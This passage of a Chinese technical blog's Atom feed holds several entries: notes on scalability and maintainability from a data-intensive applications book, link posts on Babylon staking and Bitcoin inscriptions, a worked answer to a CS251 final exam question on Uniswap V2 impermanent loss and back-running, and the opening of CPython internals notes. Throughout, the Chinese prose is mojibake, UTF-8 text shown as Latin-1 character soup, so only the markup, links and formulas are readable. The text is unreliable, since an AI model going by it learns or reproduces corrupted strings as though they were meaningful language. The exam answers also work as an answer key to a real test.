è´Ÿè½½å‚æ•°å¹¶ä¿æŒç³»ç»Ÿèµ„æºï¼ˆCPUã€å†…å­˜ã€ç½‘ç»œå¸¦å®½ç­‰ï¼‰ä¸å˜æ—¶ï¼Œç³»ç»Ÿæ€§èƒ½å°†å—åˆ°ä»€ä¹ˆå½±å“ï¼Ÿ</li><li>å¢åŠ è´Ÿè½½å‚æ•°å¹¶å¸Œæœ›ä¿æŒæ€§èƒ½ä¸å˜æ—¶ï¼Œéœ€è¦å¢åŠ å¤šå°‘ç³»ç»Ÿèµ„æºï¼Ÿ</li></ul></li><li>ååé‡ï¼ˆthroughputï¼‰ï¼šæ¯ç§’å¯ä»¥å¤„ç†çš„è®°å½•æ•°é‡ï¼Œæˆ–è€…åœ¨ç‰¹å®šè§„æ¨¡æ•°æ®é›†ä¸Šè¿è¡Œä½œä¸šçš„æ€»æ—¶é—´ï¼›</li><li>å“åº”æ—¶é—´ï¼ˆresponse timeï¼‰å’Œå»¶è¿Ÿï¼ˆlatencyï¼‰<ul><li>å“åº”æ—¶é—´ï¼šç½‘ç»œå»¶è¿Ÿ + queuing + service time</li><li>å»¶è¿Ÿï¼šè¯·æ±‚èŠ±è´¹åœ¨å¤„ç†ä¸Šçš„æ—¶é—´ã€‚</li></ul></li><li>ç™¾åˆ†ä½æ•°ï¼ˆPercentileï¼‰ï¼š<ul><li>å“åº”æ—¶é—´å¦‚æœç›´æ¥æ•°å­¦å¹³å‡ï¼Œæ— æ³•åæ˜ å¤§è‡´æœ‰å¤šå°‘è¯·æ±‚å—åˆ°å½±å“</li><li>p95, p99, p999è¡¨ç¤ºæœ‰95%, 99%, 99.9%çš„è¯·æ±‚çš„å“åº”æ—¶é—´å¿«äºæŸä¸ªå€¼ã€‚</li></ul></li><li>å°¾éƒ¨å»¶è¿Ÿï¼ˆtail latenciesï¼‰ï¼šå“åº”æ—¶é—´çš„é«˜ç™¾åˆ†ä½ç‚¹æœ‰æ—¶ä¹Ÿå¾ˆé‡è¦<ul><li>å¯¹äºAmazonï¼Œå¤§å®¢æˆ·è¯·æ±‚çš„æ•°æ®é‡å¤§ï¼Œå“åº”æ—¶é—´ä¹Ÿå°±æ›´é•¿ï¼Œä¸èƒ½ä¸å…³æ³¨ã€‚</li></ul></li><li>SLO/SLA: Service Level Objective/Agreements, ç”¨ç™¾åˆ†ä½æ•°æ¥åˆ¤æ–­ç³»ç»Ÿæ˜¯å¦å¯ç”¨ã€‚</li><li>æµ‹è¯•æ—¶è´Ÿè½½ç”Ÿæˆç‹¬ç«‹äºå“åº”æ—¶é—´æ¥æŒç»­å‘é€è¯·æ±‚ï¼Œä¸èƒ½ç­‰åˆ°æ”¶åˆ°å“åº”æ‰è½°ä¸‹ä¸€ä¸ªè¯·æ±‚ã€‚</li></ul><h3><span id="ying-dui-fu-zai-zeng-jia-de-fang-fa">åº”å¯¹è´Ÿè½½å¢åŠ çš„æ–¹æ³•</span></h3><ul><li>çºµå‘æ‰©å±•ï¼ˆscaling upï¼‰ï¼ˆå‚ç›´æ‰©å±•ï¼ˆvertical scalingï¼‰ï¼Œè½¬å‘æ›´å¼ºå¤§çš„æœºå™¨ï¼‰</li><li>æ¨ªå‘æ‰©å±•ï¼ˆscaling outï¼‰ ï¼ˆæ°´å¹³æ‰©å±•ï¼ˆhorizontal scalingï¼‰ï¼Œå°†è´Ÿè½½åˆ†å¸ƒåˆ°å¤šå°å°æœºå™¨ä¸Šï¼‰</li></ul><h2><span id="ke-wei-hu-xing">å¯ç»´æŠ¤æ€§</span></h2><p>è½¯ä»¶å¼€å‘æœ¬èº«å¼€é”€å¹¶ä¸ç®—å¤§ï¼Œæ—¥åçš„ç»´æŠ¤å‡çº§éœ€è¦èŠ±è´¹æ›´å¤šã€‚</p><p>è½¯ä»¶ç³»ç»Ÿçš„ä¸‰ä¸ªè®¾è®¡åŸåˆ™ï¼š</p><ul><li><p>å¯è¿ç»´æ€§ï¼ˆOperabilityï¼‰</p><p>æ–¹ä¾¿è¿è¥å›¢é˜Ÿæ¥ä¿æŒç³»ç»Ÿå¹³ç¨³è¿è¡Œã€‚</p></li><li><p>ç®€å•æ€§ï¼ˆSimplicityï¼‰ç®€åŒ–ç³»ç»Ÿå¤æ‚æ€§ï¼Œä½¿æ–°å·¥ç¨‹å¸ˆèƒ½å¤Ÿè½»æ¾ç†è§£ç³»ç»Ÿã€‚æ³¨æ„è¿™ä¸ç”¨æˆ·ç•Œé¢çš„ç®€å•æ€§å¹¶ä¸ä¸€æ ·ã€‚</p></li><li><p>å¯æ¼”åŒ–æ€§ï¼ˆEvolvabilityï¼‰åç»­å·¥ç¨‹å¸ˆèƒ½å¤Ÿè½»æ¾åœ°å¯¹ç³»ç»Ÿè¿›è¡Œæ”¹è¿›ï¼Œäº•æ ¹æ®éœ€æ±‚å˜åŒ–å°†å…¶é€‚é…åˆ°éå…¸å‹åœºæ™¯ï¼Œä¹Ÿç§°ä¸ºå¯å»¶ä¼¸æ€§ã€æ˜“ä¿®æ”¹æ€§æˆ–å¯å¡‘æ€§ã€‚</p></li></ul><h3><span id="ke-yun-wei-xing">å¯è¿ç»´æ€§</span></h3><ul><li>è‰¯å¥½çš„ç›‘æ§</li><li>è‡ªåŠ¨åŒ–</li><li>é¿å…ä¾èµ–å•å°æœºå™¨</li><li>è‰¯å¥½çš„æ–‡æ¡£å’Œæ˜“äºç†è§£çš„æ“ä½œæ¨¡å‹</li><li>é»˜è®¤è¡Œä¸ºå’Œå¯è¦†ç›–</li><li>è‡ªæˆ‘ä¿®å¤</li><li>è¡Œä¸ºå¯é¢„æµ‹</li><li>å…¶ä»–<ul><li>é€‚å½“çš„æ—¥å¿—æ¥è·Ÿè¸ªå‡ºé—®é¢˜ï¼ˆç³»ç»Ÿæ•…éšœæˆ–æ€§èƒ½ä¸‹é™ï¼‰çš„æ ¹æº</li><li>ä¿è¯ç³»ç»Ÿèƒ½å‡çº§ï¼Œå°¤å…¶æ˜¯å®‰å…¨è¡¥ä¸</li><li>æ­£ç¡®çš„é…ç½®</li><li>å¼€å‘æ—¶éµå¾ªæœ€ä½³å®è·µ</li></ul></li></ul><h3><span id="jian-dan-xing">ç®€å•æ€§</span></h3><p>ä¿è¯ä»£ç ç®€æ´ï¼Œè®©æ–°åŠ å…¥çš„ç å†œä¹Ÿèƒ½ç†è§£ä»£ç ã€‚ä¸€ä¸ªå¾ˆæœ‰æ•ˆçš„æ–¹æ³•æ˜¯æŠ½è±¡ï¼Œç”¨é«˜çº§ç±»æ¥æè¿°ç»Ÿä¸€çš„è¡Œä¸ºã€‚</p><ul><li>é˜²æ­¢çŠ¶æ€ç©ºé—´çˆ†ç‚¸</li><li>è®©ç³»ç»Ÿä¸­çš„æ¨¡å—å°½é‡è§£è€¦ï¼Œå‡å°‘ä¾èµ–</li><li>ä¿è¯ä¸€è‡´çš„å‘½å</li><li>å‡å°‘çŸ­è§†çš„hacks</li></ul><h3><span id="ke-yan-hua-xing">å¯æ¼”åŒ–æ€§</span></h3><p>æ–¹ä¾¿åç»­é‡æ„ã€åŠ å…¥æ–°åŠŸèƒ½é‚£ä¸ªï¼Œä¸å‰é¢çš„ç®€å•æ€§æ¯æ¯ç›¸å…³ã€‚</p><ul><li>æ•æ·å·¥ä½œæ¨¡å¼æ¯”è¾ƒæ–¹ä¾¿æ”¹å˜</li><li>TDDï¼šæµ‹è¯•é©±åŠ¨å¼€å‘</li></ul><h2><span id="can-kao">å‚è€ƒ</span></h2><ul><li><a href="https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/">https://bobbyliujb.github.io/2020/01/14/designing_data_intensive_app/</a></li></ul><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ã€Šæ•°æ®å¯†é›†å‹åº”ç”¨çš„è®¾è®¡ã€‹è¯»ä¹¦ç¬”è®°â”€â”€ç¬¬ä¸€ç« ï¼šå¯é æ€§ï¼Œå¯æ‰©å±•æ€§ï¼Œå¯ç»´æŠ¤æ€§
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="è¯»ä¹¦ç¬”è®°" scheme="https://qiwihui.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Babylon è´¨æŠ¼åè®®</title>
    <link href="https://qiwihui.com/qiwihui-blog-174/"/>
    <id>https://qiwihui.com/qiwihui-blog-174/</id>
    <published>2024-05-15T02:25:31.335Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>video: <a href="https://youtu.be/xX6plmRB4hg">https://youtu.be/xX6plmRB4hg</a></p><p>docs: <a href="https://qiwihui.notion.site/Babylon-bitcoin-staking-protocol-b07554e575424f13b3ddf240bbbf2657?pvs=4">https://qiwihui.notion.site/Babylon-bitcoin-staking-protocol-b07554e575424f13b3ddf240bbbf2657?pvs=4</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Babylon è´¨æŠ¼åè®®
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Bitcoin é“­æ–‡åŸç†</title>
    <link href="https://qiwihui.com/qiwihui-blog-173/"/>
    <id>https://qiwihui.com/qiwihui-blog-173/</id>
    <published>2024-05-15T02:25:31.316Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>video: <a href="https://youtu.be/ADaKhkkQa_E">https://youtu.be/ADaKhkkQa_E</a></p><p>docs: <a href="https://qiwihui.notion.site/Bitcoin-08d37baeabce47fcb72f6195bb38a25c?pvs=4">https://qiwihui.notion.site/Bitcoin-08d37baeabce47fcb72f6195bb38a25c?pvs=4</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Bitcoin é“­æ–‡åŸç†
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CS251 - final 2021 - é—®é¢˜ 3</title>
    <link href="https://qiwihui.com/qiwihui-blog-156/"/>
    <id>https://qiwihui.com/qiwihui-blog-156/</id>
    <published>2024-05-15T02:25:31.314Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p><strong><em>é—®é¢˜3ï¼ˆ20åˆ†ï¼‰: Automated market maker (AMM).</em></strong></p><p><em>ä½ ä½œä¸ºUniswap V2çš„æµåŠ¨æ€§æä¾›è€…ï¼Œä¸ºDAI/ETHæ± è´¡çŒ®5ä¸ªETHåŠ5000ä¸ªDAIã€‚å‡è®¾1ä¸ªDAIå€¼1ç¾å…ƒï¼Œé‚£ä¹ˆä½ çš„å‡ºèµ„æ€»é¢ä¸º1ä¸‡ç¾å…ƒã€‚</em></p><p><em>A)Â Â Â  å‡ ä¸ªæœˆåï¼Œ1ä¸ªETHçš„ä»·æ ¼ä¸Šå‡åˆ°2000 DAIã€‚åœ¨DAI/ETHæ± é€‚åº”è¿™ä¸ªæ–°çš„æ±‡ç‡ç¨³å®šä¸‹æ¥ä»¥åï¼Œæ‚¨å†³å®šæ’¤å›ä½œä¸ºæµåŠ¨æ€§æä¾›è€…çš„å…¨éƒ¨ä»½é¢ã€‚å‡è®¾ç³»ç»Ÿä¸æ”¶è´¹(âˆ…= 1)ï¼Œä½ ä¼šæ”¶åˆ°å¤šå°‘ETHå’ŒDAI ?</em></p><span id="more"></span><p><strong>ç­”ï¼š</strong> å‡è®¾åˆå§‹æ—¶æµåŠ¨æ€§æ± ä¸­ ETH å’Œ DAI çš„æ•°é‡ä¸º$x$ï¼Œ$y$ï¼Œæä¾›çš„<em>5ä¸ª ETH å’Œ5000ä¸ª DAI</em> æµåŠ¨æ€§å æ¯”ä¸º $w$ï¼Œåˆ™æ­¤æ—¶è¾¹é™…ä»·æ ¼ï¼ˆmarginal priceï¼‰ä¸º$M_p=\frac{y}{x}=\frac{5000}{5}=1000$ï¼›</p><p>è®¾ä»·æ ¼å˜åŒ–ä¹‹åæµåŠ¨æ€§æ± ä¸­ ETH å’Œ DAI çš„æ•°é‡ä¸º $xâ€™$ï¼Œ$yâ€™$ï¼Œåˆ™æœ‰ $M_pâ€™=\frac{yâ€™}{xâ€™}=2000=2M_p$ï¼›</p><p>æ ¹æ®æ’å®šä¹˜ç§¯å…¬å¼ $xy=xâ€™yâ€™=k$ï¼Œä»¥åŠ $M_p=\frac{y}{x}$ï¼Œ$M_pâ€™=\frac{yâ€™}{xâ€™}$ï¼Œå¯ä»¥æ¨å‡ºï¼š</p><p>$xâ€™=\sqrt{\frac{k}{M_pâ€™}}=\sqrt{\frac{k}{2M_p}}=\frac{1}{\sqrt{2}}x$ï¼Œ$yâ€™=\sqrt{2kM_pâ€™}=\sqrt{2}y$ï¼Œ</p><p>ç”±äºæµåŠ¨æ€§å æ¯”ä¸å˜ï¼Œæ‰€ä»¥å–å›çš„ ETH ä¸º $wxâ€™=\frac{1}{\sqrt{2}}wx=5\frac{1}{\sqrt{2}}=3.5355$ï¼ŒDAI ä¸º $wyâ€™=\sqrt{2}wy=5000\sqrt{2}=7071.0678$</p><p>æ•…å¯ä»¥æ”¶åˆ° 3.5355 ETH å’Œ 7071.0678 DAI</p><p><em>B)Â Â Â  å¦‚æœä½ è‡ªå·±æŒæœ‰ä½ çš„5 ETHå’Œ5000 DAIï¼Œä½ çš„èµ„äº§ç°åœ¨å°†ä»·å€¼15K DAIï¼Œè·å–äº†5000 DAIçš„åˆ©æ¶¦ã€‚åœ¨è¿™å‡ ä¸ªæœˆé‡Œï¼Œä½œä¸ºUniswap V2çš„æµåŠ¨æ€§æä¾›è€…ï¼Œä¸â€œè‡ªå·±æŒæœ‰â€ç­–ç•¥ç›¸æ¯”ï¼Œä½ çš„æŸå¤±æ˜¯å¤šå°‘? å°†æŸå¤±ä»¥ç¾å…ƒçš„ç»å¯¹å€¼è¡¨ç¤ºï¼Œå‡è®¾1 DAI = 1 USDã€‚è¿™è¢«ç§°ä¸ºæš‚æ—¶æ€§æŸå¤±ï¼Œå°½ç®¡åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¿™ç§æŸå¤±æ˜¯ç›¸å½“æ°¸ä¹…æ€§çš„ã€‚</em></p><p><strong>ç­”ï¼š</strong> æŒ‰ç›®å‰çš„ä»·æ ¼ï¼Œæ”¶å›çš„ ETH å’Œ DAI çš„ä»·å€¼ä¸º $3.5355*2000+7071.0678=14142.0678$ï¼ŒæŸå¤±ä¸º $15000-14142.0678=857.9322$ï¼ŒæŸå¤±ç‡ä¸º $\frac{857.9322}{15000}=0.057=5.7%$ï¼Œæ•…æŸå¤± 857.9322 USDã€‚</p><p><em>C)Â Â Â  å¦‚æœæ‚¨å› æ‹…ä»»Uniswap V2çš„æµåŠ¨æ€§æä¾›è€…è€ŒæŸå¤±äº†xç¾å…ƒï¼ŒUniswap V2æ˜¯ç”¨éƒ¨åˆ†ï¼ˆbï¼‰è®¡ç®—xçš„ï¼Œé‚£ä¹ˆè¿™äº›èµ„é‡‘æµå‘äº†å“ªé‡Œï¼Ÿå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯è°åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­è·å¾—äº†xç¾å…ƒï¼Ÿ</em></p><p><strong>ç­”ï¼š</strong> è¿™äº›æŸå¤±å°†ä¼šç”±å¥—åˆ©äº¤æ˜“è€…è·å¾—ã€‚å½“å¤–éƒ¨ ETH ä»·æ ¼ä¸Šå‡æ—¶ï¼Œå¥—åˆ©äº¤æ˜“è€…ä¼šé€šè¿‡å‘ ETH/DAI æ± ä¸­æ·»åŠ  DAI å–å‡º ETH æ¥ä½¿å¾—æ± ä¸­çš„ ETH ä»·æ ¼æ¯”ä¾‹è¾¾åˆ°å¤–éƒ¨ ETH ä»·æ ¼ï¼Œç”±äºæ± ä¸­æµåŠ¨æ€§ä¹˜ç§¯æ’å®šï¼Œå› æ­¤å–å‡ºçš„ ETH çš„å¥—åˆ©åˆ©æ¶¦å³ä¸ºæµåŠ¨æ€§æä¾›è€…çš„æŸå¤±ã€‚</p><p><em>D)Â Â Â  Â ç°åœ¨è®©æˆ‘ä»¬è½¬å‘ä½¿ç”¨Uniswap V2 äº¤æ˜“ã€‚å‡è®¾Bobä½¿ç”¨DAI/ETHæ± å°†DAIå…‘æ¢æˆETHè¿›è¡Œå¤§å‹ äº¤æ˜“ã€‚äº¤æ˜“å®Œæˆåï¼ŒDAI/ETHæ± ä¸­çš„DAIé‡‘é¢æ¯”ä¹‹å‰ç•¥é«˜ï¼Œè€ŒETHçš„é‡‘é¢åˆ™ç•¥ä½ã€‚å› æ­¤ï¼ŒDAI/ETHÂ  æ± ä¸­çš„èµ„äº§æ¯”ç‡æœ‰ç‚¹åç¦»å…¶å¹³è¡¡ç‚¹ã€‚</em></p><p><em>å¥—åˆ©è€…Aliceå‘ç°äº†è¿™ä¸ªæœºä¼šï¼Œå¹¶å¸Œæœ›åœ¨åæ–¹å‘å‘è¡Œä¸€ä¸ªäº¤æ˜“ï¼Œä»¥é‡æ–°å¹³è¡¡èµ„é‡‘æ± ã€‚å¥¹æ—¨åœ¨ä»è¿™ç¬”äº¤æ˜“ä¸­è·åˆ©ï¼Œæ‰€ä»¥å¸Œæœ›ç¡®ä¿å¥¹çš„äº¤æ˜“åœ¨Bobäº¤æ˜“åè¢«ç«‹å³æ‰§è¡Œã€‚è¿™ç§ç­–ç•¥è¢«ç§°ä¸ºâ€œå°¾éšâ€ã€‚</em></p><p><em>é‚£ä¹ˆAliceå¦‚ä½•èƒ½å®æ–½å°¾éšè®¡åˆ’å‘¢ï¼Ÿè¯·æå‡ºå¯ä»¥ä½¿Aliceçš„äº¤æ˜“åœ¨Bobä¹‹åå¯ä»¥æœ‰åˆç†æœºä¼šè¢«ç«‹å³è¢«æ‰§è¡Œçš„æ–¹æ³•ã€‚</em></p><p><strong>ç­”ï¼š</strong> Alice å¯ä»¥åˆ©ç”¨ä¸€å®šé‡è´¦æˆ·å’Œä¸€ä¸ªåˆçº¦æ¥ä½¿å¾—å…¶äº¤æ˜“åœ¨Bobäº¤æ˜“ä¹‹åè¢«ç«‹å³æ‰§è¡Œï¼Œå…·ä½“æ­¥éª¤ä¸ºï¼š</p><ol><li>Alice éƒ¨ç½²ä¸€ä¸ªåˆçº¦ï¼Œè¿™ä¸ªåˆçº¦å¯ä»¥æäº¤äº¤æ˜“ï¼Œå¹¶é¢„å…ˆå­˜å…¥ç”¨äºäº¤æ˜“çš„ETHï¼›</li><li>å‡†å¤‡ä¸€å®šæ•°é‡çš„è´¦æˆ·ï¼Œè´¦æˆ·ä¸­å­˜å…¥å¯ç”¨ä»¥æ”¯ä»˜gasçš„ETHï¼›</li><li>Alice ç›‘å¬ä»¥å¤ªåŠçš„äº¤æ˜“æ± ï¼Œå½“ç›‘å¬åˆ° Bob çš„äº¤æ˜“æ—¶ï¼Œé€šè¿‡æ¯ä¸€ä¸ªè´¦æˆ·è°ƒç”¨éƒ¨ç½²çš„åˆçº¦å¹¿æ’­ä¸€ä¸ªäº¤æ˜“ï¼Œè¿™ä¸ªäº¤æ˜“çš„ gas ä»·æ ¼<strong>ç­‰äº</strong> Bob äº¤æ˜“çš„ gas ä»·æ ¼ã€‚</li></ol><p>ç”±äºä»¥å¤ªåŠä¸­çŸ¿å·¥åœ¨æ‰“åŒ…äº¤æ˜“æ—¶æ˜¯æ ¹æ®äº¤æ˜“çš„gasä»·æ ¼é«˜ä½è¿›è¡Œçš„ï¼Œè¿™æ ·å°†ä¼šä½¿å¾— Alice å¹¿æ’­çš„äº¤æ˜“æœ‰æœºä¼šå¤„äº Bob äº¤æ˜“çš„åçš„ç¬¬ä¸€ä¸ªäº¤æ˜“ï¼Œä»è€Œè¾¾åˆ°è·åˆ©æœºä¼šã€‚</p><p><em>E)Â Â Â Â  Â å‡è®¾10ä¸ªä¸åŒçš„å¥—åˆ©è€…ï¼Œä¸ºæ•è·Bobçš„äº¤æ˜“åˆ›é€ çš„å¥—åˆ©æœºä¼šï¼Œ åœ¨åŒä¸€æ—¶é—´æ‰§è¡Œäº†ç›¸åŒçš„å°¾éšæ“ä½œç­–ç•¥ã€‚ä»–ä»¬éƒ½ä½¿ç”¨äº†ä½ åœ¨(D)éƒ¨åˆ†ä¸­æ‰€æè¿°çš„ç›¸åŒæœºåˆ¶ï¼Œé‚£ä¹ˆè¿™10ä¸ªä¸­çš„å“ªä¸€ä¸ªä¼šè·èƒœå‘¢ï¼Ÿ</em></p><p><strong>ç­”ï¼š</strong> ç”±äºä»¥å¤ªåŠä¸­çŸ¿å·¥åœ¨æ‰“åŒ…äº¤æ˜“æ—¶æ˜¯æ ¹æ®äº¤æ˜“çš„ gas ä»·æ ¼é«˜ä½è¿›è¡Œçš„ï¼Œå› æ­¤å¯¹äºæ‰€æœ‰ gas ä»·æ ¼å’ŒBobçš„äº¤æ˜“çš„ Gas ä»·æ ¼ä¸€è‡´çš„äº¤æ˜“ï¼Œéƒ½æœ‰èƒ½è¢«æ’åºåœ¨Bobäº¤æ˜“ä¹‹åï¼Œæ‰€ä»¥è¿™äº›äº¤æ˜“ä¸­å¤„åœ¨ Bob äº¤æ˜“ä¹‹åçš„ç¬¬ä¸€ä¸ªäº¤æ˜“å°†è·åˆ©ï¼Œå¯¹åº”çš„å¥—åˆ©è€…è·èƒœã€‚</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      CS251 - final 2021 - é—®é¢˜ 3
    
    </summary>
    
    
      <category term="åŒºå—é“¾" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>CPython Internals ç¬”è®° â”€â”€ Python è¯­è¨€å’Œè¯­æ³•</title>
    <link href="https://qiwihui.com/qiwihui-blog-150/"/>
    <id>https://qiwihui.com/qiwihui-blog-150/</id>
    <published>2024-05-15T02:25:31.312Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>ç¼–è¯‘å™¨çš„ç›®çš„æ˜¯å°†ä¸€ç§è¯­è¨€è½¬æ¢æˆå¦ä¸€ç§è¯­è¨€ã€‚æŠŠç¼–è¯‘å™¨æƒ³è±¡æˆä¸€ä¸ªç¿»è¯‘å™¨ã€‚æ¯”å¦‚ä½ ä¼šé›‡ä¸€ä¸ªç¿»è¯‘æ¥å¬ä½ è¯´è‹±è¯­ï¼Œç„¶åç¿»è¯‘æˆæ—¥è¯­ã€‚</p><p>ä¸ºæ­¤ï¼Œç¿»è¯‘äººå‘˜å¿…é¡»äº†è§£æºè¯­è¨€å’Œç›®æ ‡è¯­è¨€çš„è¯­æ³•ç»“æ„ã€‚</p><p>æœ‰äº›ç¼–è¯‘å™¨ä¼šç¼–è¯‘æˆä½çº§æœºå™¨ç ï¼Œå¯ä»¥ç›´æ¥åœ¨ç³»ç»Ÿä¸Šæ‰§è¡Œã€‚å…¶ä»–ç¼–è¯‘å™¨ä¼šç¼–è¯‘æˆä¸€ç§ä¸­é—´è¯­è¨€ï¼Œç”±è™šæ‹Ÿæœºæ‰§è¡Œã€‚</p><p>é€‰æ‹©ç¼–è¯‘å™¨æ—¶çš„ä¸€ä¸ªè€ƒè™‘å› ç´ æ˜¯ç³»ç»Ÿå¯ç§»æ¤æ€§è¦æ±‚ã€‚<a href="https://en.wikipedia.org/wiki/Java_bytecode">Java</a>å’Œ <a href="https://en.wikipedia.org/wiki/Common_Language_Runtime">.NET CLR</a>å°†ç¼–è¯‘æˆä¸€ç§ä¸­é—´è¯­è¨€ï¼Œä»¥ä¾¿ç¼–è¯‘åçš„ä»£ç å¯ä»¥è·¨å¤šä¸ªç³»ç»Ÿæ¶æ„ç§»æ¤ã€‚Cã€Goã€C++ å’Œ Pascal å°†ç¼–è¯‘æˆå¯æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚æ­¤äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯ä¸ºç¼–è¯‘å®ƒçš„å¹³å°æ„å»ºçš„ã€‚</p><p>Python åº”ç”¨ç¨‹åºé€šå¸¸ä½œä¸ºæºä»£ç åˆ†å‘ã€‚Python è§£é‡Šå™¨çš„ä½œç”¨æ˜¯å°†Pythonæºä»£ç è¿›è¡Œè½¬æ¢å¹¶ä¸€æ­¥æ‰§è¡Œã€‚CPython è¿è¡Œæ—¶åœ¨ç¬¬ä¸€æ¬¡è¿è¡Œæ—¶ä¼šç¼–è¯‘ä½ çš„ä»£ç ã€‚è¿™ä¸€æ­¥å¯¹æ™®é€šç”¨æˆ·æ˜¯ä¸å¯è§çš„ã€‚</p><p>Python ä»£ç ä¸ä¼šè¢«ç¼–è¯‘æˆæœºå™¨ç ï¼›å®ƒè¢«ç¼–è¯‘æˆä¸€ç§ç§°ä¸º <strong>å­—èŠ‚ç </strong> çš„ä½çº§ä¸­é—´è¯­è¨€ã€‚æ­¤å­—èŠ‚ç å­˜å‚¨åœ¨ <code>.pyc</code> æ–‡ä»¶ä¸­å¹¶ç¼“å­˜ä»¥ä¾›æ‰§è¡Œã€‚å¦‚æœåœ¨ä¸æ›´æ”¹æºä»£ç çš„æƒ…å†µä¸‹ä¸¤æ¬¡è¿è¡ŒåŒä¸€ä¸ª Python åº”ç”¨ç¨‹åºï¼Œåˆ™ç¬¬äºŒæ¬¡æ‰§è¡Œé€Ÿåº¦ä¼šæ›´å¿«ã€‚è¿™æ˜¯å› ä¸ºå®ƒåŠ è½½ç¼–è¯‘åçš„å­—èŠ‚ç è€Œä¸æ˜¯æ¯æ¬¡éƒ½é‡æ–°ç¼–è¯‘ã€‚</p><span id="more"></span><h2><span id="wei-shi-me-cpython-shi-yong-c-er-bu-shi-yong-python-bian-xie">ä¸ºä»€ä¹ˆ CPython æ˜¯ç”¨ C è€Œä¸æ˜¯ç”¨ Python ç¼–å†™</span></h2><p>CPython ä¸­çš„ <strong>C</strong> æ˜¯å¯¹ C ç¼–ç¨‹è¯­è¨€çš„å¼•ç”¨ï¼Œè¿™æ„å‘³ç€è¿™ä¸ª Python å‘è¡Œç‰ˆæ˜¯ç”¨ C è¯­è¨€ç¼–å†™çš„ã€‚</p><p>è¿™ç§è¯´æ³•å¤§å¤šæ˜¯æ­£ç¡®çš„ï¼šCPython ä¸­çš„ç¼–è¯‘å™¨æ˜¯ç”¨çº¯ C ç¼–å†™çš„ã€‚ä½†æ˜¯ï¼Œè®¸å¤šæ ‡å‡†åº“æ¨¡å—æ˜¯ç”¨çº¯ Python æˆ– C å’Œ Python ç»„åˆç¼–å†™çš„ã€‚</p><p><strong>é‚£ä¹ˆä¸ºä»€ä¹ˆ CPython ç¼–è¯‘å™¨æ˜¯ç”¨ C è€Œä¸æ˜¯ Python ç¼–å†™çš„å‘¢ï¼Ÿ</strong></p><p>ç­”æ¡ˆåœ¨äºç¼–è¯‘å™¨çš„å·¥ä½œæ–¹å¼ã€‚ æœ‰ä¸¤ç§ç±»å‹çš„ç¼–è¯‘å™¨ï¼š</p><ol><li><p><a href="https://en.wikipedia.org/wiki/Self-hosting_(compilers)">è‡ªä¸¾ç¼–è¯‘å™¨</a>æ˜¯ç”¨å®ƒä»¬ç¼–è¯‘çš„è¯­è¨€ç¼–å†™çš„ç¼–è¯‘å™¨ï¼Œä¾‹å¦‚ Go ç¼–è¯‘å™¨ã€‚è¿™æ˜¯é€šè¿‡ç§°ä¸ºå¼•å¯¼çš„è¿‡ç¨‹å®Œæˆçš„ã€‚</p></li><li><p><a href="https://en.wikipedia.org/wiki/Source-to-source_compiler">æºåˆ°æºç¼–è¯‘å™¨</a>æ˜¯ç”¨å¦ä¸€ç§å·²ç»æœ‰ç¼–è¯‘å™¨çš„è¯­è¨€ç¼–å†™çš„ç¼–è¯‘å™¨ã€‚</p></li></ol><p>å¦‚æœä½ è¦ä»å¤´å¼€å§‹ç¼–å†™æ–°çš„ç¼–ç¨‹è¯­è¨€ï¼Œåˆ™éœ€è¦ä¸€ä¸ªå¯æ‰§è¡Œåº”ç”¨ç¨‹åºæ¥ç¼–è¯‘ä½ çš„ç¼–è¯‘å™¨ï¼ä½ 